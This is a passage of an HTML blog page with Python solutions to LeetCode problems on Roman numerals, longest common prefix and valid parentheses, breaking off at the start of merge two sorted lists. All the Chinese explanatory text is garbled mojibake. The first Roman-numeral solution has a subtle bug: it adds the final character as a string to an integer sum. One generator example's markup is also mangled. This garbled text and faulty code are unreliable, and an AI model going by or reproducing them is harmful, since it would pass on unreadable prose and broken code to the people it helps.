<h3 id="Question-v4">Question</h3>
<p>ç½—é©¬æ•°å­—åŒ…å«ä»¥ä¸‹ä¸ƒç§å­—ç¬¦: Iï¼Œ Vï¼Œ Xï¼Œ Lï¼ŒCï¼ŒD å’Œ Mã€‚</p>
<blockquote>
<p>å­—ç¬¦          æ•°å€¼<br>
I             1<br>
V             5<br>
X             10<br>
L             50<br>
C             100<br>
D             500<br>
M             1000</p>
</blockquote>
<p>ä¾‹å¦‚ï¼Œ ç½—é©¬æ•°å­— 2 å†™åš II ï¼Œå³ä¸ºä¸¤ä¸ªå¹¶åˆ—çš„ 1ã€‚12 å†™åš XII ï¼Œå³ä¸º X + II ã€‚ 27 å†™åš  XXVII, å³ä¸º XX + V + II ã€‚</p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œç½—é©¬æ•°å­—ä¸­å°çš„æ•°å­—åœ¨å¤§çš„æ•°å­—çš„å³è¾¹ã€‚ä½†ä¹Ÿå­˜åœ¨ç‰¹ä¾‹ï¼Œä¾‹å¦‚ 4 ä¸å†™åš IIIIï¼Œè€Œæ˜¯ IVã€‚æ•°å­— 1 åœ¨æ•°å­— 5 çš„å·¦è¾¹ï¼Œæ‰€è¡¨ç¤ºçš„æ•°ç­‰äºå¤§æ•° 5 å‡å°æ•° 1 å¾—åˆ°çš„æ•°å€¼ 4 ã€‚åŒæ ·åœ°ï¼Œæ•°å­— 9 è¡¨ç¤ºä¸º IXã€‚è¿™ä¸ªç‰¹æ®Šçš„è§„åˆ™åªé€‚ç”¨äºä»¥ä¸‹å…­ç§æƒ…å†µï¼š</p>
<ul>
<li>I å¯ä»¥æ”¾åœ¨ V (5) å’Œ X (10) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 4 å’Œ 9ã€‚</li>
<li>X å¯ä»¥æ”¾åœ¨ L (50) å’Œ C (100) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 40 å’Œ 90ã€‚</li>
<li>C å¯ä»¥æ”¾åœ¨ D (500) å’Œ M (1000) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 400 å’Œ 900ã€‚</li>
</ul>
<p>ç»™å®šä¸€ä¸ªç½—é©¬æ•°å­—ï¼Œå°†å…¶è½¬æ¢æˆæ•´æ•°ã€‚è¾“å…¥ç¡®ä¿åœ¨ 1 åˆ° 3999 çš„èŒƒå›´å†…ã€‚</p>
<h3 id="Example-v4">Example</h3>
<p><strong>ç¤ºä¾‹ 1:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: &quot;III&quot;</span><br><span class="line">è¾“å‡º: 3</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹ 2:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: &quot;IV&quot;</span><br><span class="line">è¾“å‡º: 4</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹ 3:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: &quot;IX&quot;</span><br><span class="line">è¾“å‡º: 9</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹ 4:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: &quot;LVIII&quot;</span><br><span class="line">è¾“å‡º: 58</span><br><span class="line">è§£é‡Š: L &#x3D; 50, V&#x3D; 5, III &#x3D; 3.</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹ 5:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: &quot;MCMXCIV&quot;</span><br><span class="line">è¾“å‡º: 1994</span><br><span class="line">è§£é‡Š: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4.</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v4">Solution</h3>
<h4 id="æ–¹æ³•ä¸€-v3">æ–¹æ³•ä¸€</h4>
<p><strong>æ€è·¯</strong>ï¼šä»å·¦å¾€å³ä¸€ä½ä¸€ä½çš„çœ‹ï¼Œå¦‚æœè¿™ä¸€ä½æ•°å­—æ¯”å®ƒå³è¾¹ä¸€ä½çš„æ•°å­—å¤§æˆ–ä¸å…¶ç›¸ç­‰ï¼Œåˆ™åŠ ä¸Šè¿™ä¸€ä½ä»£è¡¨çš„å€¼ï¼Œå¦‚æœå®ƒæ¯”å³è¾¹ä¸€ä½å°ï¼Œåˆ™å‡å»è¿™ä¸€ä½ä»£è¡¨çš„æ•°å­—ã€‚</p>
<blockquote>
<p>ä¾‹å¦‚ï¼š â€˜MMCMLXIVâ€™: ç¬¬ä¸€ä½æ˜¯Mï¼Œå®ƒçš„åä¸€ä½ä¹Ÿæ˜¯Mï¼Œæ‰€ä»¥ num = 0 + 1000ï¼Œä¹‹å M &gt; C, num = num + 1000 =2000,ä¹‹ååˆ°ç‰¹æ®Šå€¼ï¼Œå› ä¸ºC&lt;Mï¼Œæ‰€ä»¥num=num-C =2000-100=1900,ä¹‹åå†åŠ ä¸Š1000å¾—åˆ° num=2900â€¦â€¦ä»¥æ­¤ç±»æ¨è¿›è¡Œä¸‹å»ï¼Œæœ€åå¯å¾—åˆ° num = 2964</p>
</blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½ä¸åä¸€ä½çš„æ¯”è¾ƒåªéœ€è¿›è¡Œåˆ°å€’æ•°ç¬¬äºŒä½å³å¯ï¼Œå› ä¸ºæœ€åä¸€ä½æ²¡æœ‰æ¯”å®ƒå°çš„ä¸€ä½èƒ½å¤Ÿè¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥åŠ ä¸Šæœ€åä¸€ä½ä»£è¡¨çš„å€¼å³å¯ã€‚</p>
<blockquote>
<p>åˆ¤æ–­åˆ°å€’æ•°ç¬¬äºŒä½æ—¶ï¼Œå¦‚æœæœ€åä¸€ä¸ªæ•°æ¯”å‰ä¸€ä¸ªæ•°å¤§ï¼Œç¨‹åºå°±ä¼šç›´æ¥å‡å»å€’æ•°ç¬¬äºŒä¸ªæ•°ï¼Œç„¶åç›´æ¥åŠ ä¸Šæœ€åä¸€ä¸ªæ•°å°±è¡Œäº†ã€‚æ‰€ä»¥æœ€åä¸€ä¸ªæ•°ä¸ç®¡æ¯”å‰é¢çš„æ•°å¤§è¿˜æ˜¯å°éƒ½ä¼šç›´æ¥åŠ ä¸Šå®ƒçš„å€¼ã€‚</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">romanToInt</span>(<span class="params">self, s</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        roman_dict = &#123;<span class="string">&#x27;M&#x27;</span>: <span class="number">1000</span>, <span class="string">&#x27;D&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;C&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;L&#x27;</span>: <span class="number">50</span>, <span class="string">&#x27;X&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;V&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;I&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s) - <span class="number">1</span>):</span><br><span class="line">        	<span class="keyword">if</span> roman_dict.get(s[i]) &gt;= roman_dict.get(s[i+<span class="number">1</span>]):</span><br><span class="line">        		sum += roman_dict.get(s[i])</span><br><span class="line">        	<span class="keyword">else</span>:</span><br><span class="line">        		sum -= roman_dict.get(s[i])</span><br><span class="line"></span><br><span class="line">        last_num = s[len(s) - <span class="number">1</span>]</span><br><span class="line">        sum += last_num</span><br><span class="line">        <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure>
<h4 id="æ–¹æ³•äºŒ-v3">æ–¹æ³•äºŒ</h4>
<p><strong>æ€è·¯ï¼š</strong></p>
<ul>
<li>æ„å»ºä¸€ä¸ªå­—å…¸è®°å½•æ‰€æœ‰ç½—é©¬æ•°å­—å­ä¸²ï¼Œæ³¨æ„é•¿åº¦ä¸º2çš„å­ä¸²è®°å½•çš„å€¼æ˜¯**ï¼ˆå®é™…å€¼ - å­ä¸²å†…å·¦è¾¹ç½—é©¬æ•°å­—ä»£è¡¨çš„æ•°å€¼ï¼‰**ã€‚</li>
<li>è¿™æ ·ä¸€æ¥ï¼Œéå†æ•´ä¸ª s çš„æ—¶å€™åˆ¤æ–­å½“å‰ä½ç½®å’Œå‰ä¸€ä¸ªä½ç½®çš„ä¸¤ä¸ªå­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²æ˜¯å¦åœ¨å­—å…¸å†…ï¼Œå¦‚æœåœ¨å°±è®°å½•å€¼ï¼Œä¸åœ¨å°±è¯´æ˜å½“å‰ä½ç½®ä¸å­˜åœ¨å°æ•°å­—åœ¨å‰é¢çš„æƒ…å†µï¼Œç›´æ¥è®°å½•å½“å‰ä½ç½®å­—ç¬¦å¯¹åº”å€¼ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">romanToInt</span>(<span class="params">self, s</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        roman_dict = &#123;<span class="string">&#x27;M&#x27;</span>: <span class="number">1000</span>, <span class="string">&#x27;D&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;C&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;L&#x27;</span>: <span class="number">50</span>, <span class="string">&#x27;X&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;V&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;I&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;IV&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;IX&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;XL&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;XC&#x27;</span>: <span class="number">80</span>, <span class="string">&#x27;CD&#x27;</span>: <span class="number">300</span>, <span class="string">&#x27;CM&#x27;</span>: <span class="number">800</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sum(roman_dict.get(s[max(i<span class="number">-1</span>, <span class="number">0</span>): i+<span class="number">1</span>], roman_dict[n]) <span class="keyword">for</span> i, n <span class="keyword">in</span> enumerate(s))</span><br></pre></td></tr></table></figure>
<h3 id="Extra-v2">Extra</h3>
<ol>
<li>
<p><code>sum(iterable, [start]) -&gt; number</code></p>
</li>
<li>
<p>ç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰</p>
<ul>
<li>
<pre><code class="language-python">g = (x * x for x in range(10))
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- å¦‚æœä¸€ä¸ªå‡½æ•°å®šä¹‰ä¸­åŒ…å«&#96;yield&#96;å…³é”®å­—ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°å°±ä¸å†æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ªgeneratorï¼š</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;python</span><br><span class="line">  def fib(max):</span><br><span class="line">      n, a, b &#x3D; 0, 0, 1</span><br><span class="line">      while n &lt; max:</span><br><span class="line">          yield b</span><br><span class="line">          a, b &#x3D; b, a + b</span><br><span class="line">          n &#x3D; n + 1</span><br><span class="line">      return &#39;done&#39;</span><br></pre></td></tr></table></figure>



</code></pre>
</li>
</ul>
</li>
</ol>
<h2 id="14-longest-common-prefix-æœ€é•¿å…¬å…±å‰ç¼€">#14 longest-common-prefix æœ€é•¿å…¬å…±å‰ç¼€</h2>
<h3 id="Question-v5">Question</h3>
<p>ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥æŸ¥æ‰¾å­—ç¬¦ä¸²æ•°ç»„ä¸­çš„æœ€é•¿å…¬å…±å‰ç¼€ã€‚</p>
<p>å¦‚æœä¸å­˜åœ¨å…¬å…±å‰ç¼€ï¼Œè¿”å›ç©ºå­—ç¬¦ä¸² <code>&quot;&quot;</code>ã€‚</p>
<p>æ‰€æœ‰è¾“å…¥åªåŒ…å«å°å†™å­—æ¯ <code>a-z</code> ã€‚</p>
<h3 id="Example-v5">Example</h3>
<p><strong>ç¤ºä¾‹1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]</span><br><span class="line">è¾“å‡º: &quot;fl&quot;</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹2</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]</span><br><span class="line">è¾“å‡º: &quot;&quot;</span><br><span class="line">è§£é‡Š: è¾“å…¥ä¸å­˜åœ¨å…¬å…±å‰ç¼€ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="Solutions">Solutions</h3>
<h4 id="æ–¹æ³•ä¸€-v4">æ–¹æ³•ä¸€</h4>
<p><strong>æ€è·¯</strong>ï¼š</p>
<ol>
<li>é¦–å…ˆæƒ³åˆ°åˆ—è¡¨ä¸ºç©ºçš„æƒ…å†µï¼Œè¿”å›ç©ºå­—ç¬¦ä¸²ã€‚</li>
<li>ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½ä¸ç¬¬äºŒä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½æ¯”è¾ƒï¼Œè‹¥ç›¸åŒåˆ™ç»§ç»­å°†ç¬¬äºŒä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½å’Œç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²ç¬¬ä¸€ä½æ¯”è¾ƒï¼Œä¾æ¬¡ç±»æ¨ã€‚è‹¥æ¯”è¾ƒåˆ°ç¬¬<code>j</code>å’Œ<code>j+1</code>ä¸ªå­—ç¬¦ä¸²çš„ç¬¬kä½ä¸åŒåˆ™è¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²çš„å‰<code>j</code>ä¸ªå­ä¸²ï¼ˆä¸åŒ…æ‹¬ç¬¬<code>j</code>ä¸ªå­—ç¬¦ã€‚</li>
<li>è‹¥æœ€åæ‰€æœ‰å­—ç¬¦ä¸²éƒ½ç›¸åŒï¼Œåˆ™è¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²é•¿åº¦ä¸º<code>strs</code>ä¸­å…ƒç´ çš„é•¿åº¦æœ€å°çš„å­ä¸²ã€‚</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span>(<span class="params">self, strs</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type strs: List[str]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> len(strs) == <span class="number">0</span>:</span><br><span class="line">        	<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        min_len = min(list(map(len, [strs[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(strs))])))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(min_len):</span><br><span class="line">        	<span class="keyword">for</span> k <span class="keyword">in</span> range(len(strs) - <span class="number">1</span>):</span><br><span class="line">        		<span class="keyword">if</span> strs[k][j] != strs[k+<span class="number">1</span>][j]:</span><br><span class="line">        			<span class="keyword">return</span> strs[<span class="number">0</span>][:j]</span><br><span class="line">        <span class="keyword">return</span> strs[<span class="number">0</span>][:min_len] <span class="keyword">if</span> min_len <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="æ–¹æ³•äºŒ-v4">æ–¹æ³•äºŒ</h4>
<p><strong>æ€è·¯ï¼š</strong></p>
<p>åˆ©ç”¨<code>zip</code>å‡½æ•°è§£åŒ…ä»¥åŠ<code>set</code>åˆ¤æ–­æ˜¯å¦ç›¸åŒï¼Œæ¥å¯¹æ¯ä¸€ä¸ªå•è¯çš„åŒä¸€ä½ç½®çš„å­—æ¯è¿›è¡Œæ¯”è¾ƒ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span>(<span class="params">self, strs</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type strs: List[str]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        res = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> tmp <span class="keyword">in</span> zip(*strs):</span><br><span class="line">            tmp_set = set(tmp)</span><br><span class="line">            <span class="keyword">if</span> len(tmp_set) == <span class="number">1</span>:</span><br><span class="line">                res += tmp[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<h3 id="Extra-v3">Extra</h3>
<ol>
<li>
<p><code>*</code>è§£åŒ…æ“ä½œï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line"><span class="meta">... </span>    print(a,b,c)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(*[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(*(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(*<span class="string">&quot;abc&quot;</span>)</span><br><span class="line">a b c</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(*&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>,<span class="string">&quot;b&quot;</span>:<span class="number">2</span>,<span class="string">&quot;c&quot;</span>:<span class="number">3</span>&#125;)</span><br><span class="line">a b c</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>zip()</code>å‡½æ•°</p>
<p>æŠŠä¸¤ä¸ªæˆ–å¤šä¸ªæ•°ç»„çš„æ‰€æœ‰å…ƒç´ æŒ‰ç´¢å¼•å¯¹é½ï¼Œç„¶åæŒ‰ç´¢å¼•åˆå¹¶æˆæ–°æ•°ç»„ã€‚</p>
</li>
<li>
<p><code>set</code>ä¸­ä¸å…è®¸æœ‰é‡å¤çš„å…ƒç´ å­˜åœ¨ã€‚</p>
</li>
</ol>
<h2 id="20-valid-parentheses-æœ‰æ•ˆæ‹¬å·">#20 valid-parentheses æœ‰æ•ˆæ‹¬å·</h2>
<h3 id="Question-v6">Question</h3>
<p>ç»™å®šä¸€ä¸ªåªåŒ…æ‹¬ â€˜(â€™ï¼Œâ€™)â€™ï¼Œâ€™{â€™ï¼Œâ€™}â€™ï¼Œâ€™[â€™ï¼Œâ€™]â€™ çš„å­—ç¬¦ä¸²ï¼Œåˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦æœ‰æ•ˆã€‚</p>
<p>æœ‰æ•ˆå­—ç¬¦ä¸²éœ€æ»¡è¶³ï¼š</p>
<ul>
<li>å·¦æ‹¬å·å¿…é¡»ç”¨ç›¸åŒç±»å‹çš„å³æ‹¬å·é—­åˆã€‚</li>
<li>å·¦æ‹¬å·å¿…é¡»ä»¥æ­£ç¡®çš„é¡ºåºé—­åˆã€‚</li>
</ul>
<p>æ³¨æ„ç©ºå­—ç¬¦ä¸²å¯è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆå­—ç¬¦ä¸²ã€‚</p>
<h3 id="Example-v6">Example</h3>
<p><strong>ç¤ºä¾‹1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: &quot;()&quot;</span><br><span class="line">è¾“å‡º: true</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹2</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: &quot;()[]&#123;&#125;&quot;</span><br><span class="line">è¾“å‡º: true</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹3</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: &quot;(]&quot;</span><br><span class="line">è¾“å‡º: false</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹4</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: &quot;([)]&quot;</span><br><span class="line">è¾“å‡º: false</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹5</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: &quot;&#123;[]&#125;&quot;</span><br><span class="line">è¾“å‡º: true</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v5">Solution</h3>
<h4 id="æ–¹æ³•ä¸€-v5">æ–¹æ³•ä¸€</h4>
<p><strong>æ€è·¯</strong></p>
<ol>
<li>é¦–å…ˆç©ºå­—ç¬¦ä¸²è¿”å›<code>True</code></li>
<li>æ ˆå…ˆå…¥åå‡ºç‰¹ç‚¹æ°å¥½ä¸æœ¬é¢˜æ‹¬å·æ’åºç‰¹ç‚¹ä¸€è‡´ï¼Œå³è‹¥é‡åˆ°å·¦æ‹¬å·å…¥æ ˆï¼Œé‡åˆ°å³æ‹¬å·æ—¶å°†å¯¹åº”æ ˆé¡¶å·¦æ‹¬å·å‡ºæ ˆï¼Œåˆ™éå†å®Œæ‰€æœ‰æ‹¬å·å <code>stack</code> ä»ç„¶ä¸ºç©ºï¼›</li>
<li>éœ€è¦æ³¨æ„çš„æ˜¯è‹¥æ ˆä¸ºç©ºï¼Œä¸”æ­¤æ—¶è¯»å–åˆ°çš„å­—ç¬¦æ˜¯<code>right_par</code>ï¼Œåˆ™ç›´æ¥è¿”å›<code>False</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span>(<span class="params">self, s</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> s == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        left_par = [<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>]</span><br><span class="line">        right_par = [<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> s[<span class="number">0</span>] <span class="keyword">in</span> right_par:</span><br><span class="line">        	<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        l = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        	<span class="keyword">if</span> s[i] <span class="keyword">in</span> left_par:</span><br><span class="line">        		l.append(s[i])</span><br><span class="line">        	<span class="keyword">elif</span> l == [] <span class="keyword">and</span> s[i] <span class="keyword">in</span> right_par:</span><br><span class="line">        		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        	<span class="keyword">else</span>:</span><br><span class="line">        		<span class="keyword">if</span> left_par.index(l.pop(<span class="number">-1</span>)) != right_par.index(s[i]):</span><br><span class="line">        			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> l == []:</span><br><span class="line">        	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	<span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h4 id="æ–¹æ³•äºŒ-v5">æ–¹æ³•äºŒ</h4>
<blockquote>
<p>â€‹	å…¶å®æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œå…³é”®æ˜¯ç”¨å­—å…¸æ¥æ›¿æ¢æ–¹æ³•ä¸€çš„ä¸¤ä¸ªåˆå§‹åˆ—è¡¨</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span>(<span class="params">self, s: str</span>) -&gt; bool:</span></span><br><span class="line">        dic = &#123;<span class="string">&#x27;&#123;&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,  <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;?&#x27;</span>: <span class="string">&#x27;?&#x27;</span>&#125;</span><br><span class="line">        stack = [<span class="string">&#x27;?&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> dic: stack.append(c)</span><br><span class="line">            <span class="keyword">elif</span> dic[stack.pop()] != c: <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">        <span class="keyword">return</span> len(stack) == <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>è§£æ</strong></p>
<ol>
<li>
<p><code>stack</code>åˆå§‹åŒ–çš„æ—¶å€™ä¸ºä»€ä¹ˆè¦åŠ ä¸€ä¸ª<code>?</code></p>
<p>æ ˆ <code>stack</code> ä¸ºç©ºæ—¶ï¼Œ <code>stack.pop()</code> æ“ä½œä¼šæŠ¥é”™ï¼›å› æ­¤ï¼Œæˆ‘ä»¬é‡‡ç”¨ä¸€ä¸ªå–å·§æ–¹æ³•ï¼Œç»™ <code>stack</code> èµ‹åˆå€¼<code> ?</code>ï¼Œå¹¶åœ¨å“ˆå¸Œè¡¨ <code>dic</code>ä¸­å»ºç«‹<code> key: '?'ï¼Œvalue:'?'key</code>çš„å¯¹åº”å…³ç³»äºˆä»¥é…åˆã€‚æ­¤æ—¶å½“ stack ä¸ºç©ºä¸” c ä¸ºå³æ‹¬å·æ—¶ï¼Œå¯ä»¥æ­£å¸¸æå‰è¿”å› <code>false</code>ã€‚</p>
</li>
</ol>
<h3 id="Extra-v4">Extra</h3>
<ol>
<li>Pythonæ¨¡æ‹Ÿæ ˆçš„æ“ä½œ
<ul>
<li>å‹æ ˆï¼š<code>list.append()</code></li>
<li>å‡ºæ ˆï¼š<code>list.pop()</code></li>
</ul>
</li>
<li><code>range([start,] end)</code>ï¼š<code>start</code>é»˜è®¤æ˜¯0ï¼Œè¿”å›<code>start - (end-1)</code>çš„è¿­ä»£å™¨ã€‚</li>
</ol>
<h2 id="21-merge-two-sorted-lists-åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨">#21 merge-two-sorted-lists åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨</h2>
<h3 id="Question-v7">Question</h3>
<p>å°†ä¸¤ä¸ªæœ‰åºé“¾è¡¨åˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„æœ‰åºé“¾è¡¨å¹¶è¿”å›ã€‚æ–°é“¾è¡¨æ˜¯é€šè¿‡æ‹¼æ¥ç»™å®šçš„ä¸¤ä¸ªé“¾è¡¨çš„æ‰€æœ‰èŠ‚ç‚¹ç»„æˆçš„ã€‚</p>
<h3 id="Example-v7">Example</h3>
<p><strong>ç¤ºä¾‹</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ï¼š1-&gt;2-&gt;4, 1-&gt;3-&gt;4</span><br><span class="line">è¾“å‡ºï¼š1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v6">Solution</h3>
<h4 id="æ–¹æ³•ä¸€-v6">æ–¹æ³•ä¸€</h4>
<p><strong>æ€è·¯</strong></p>
<ol>
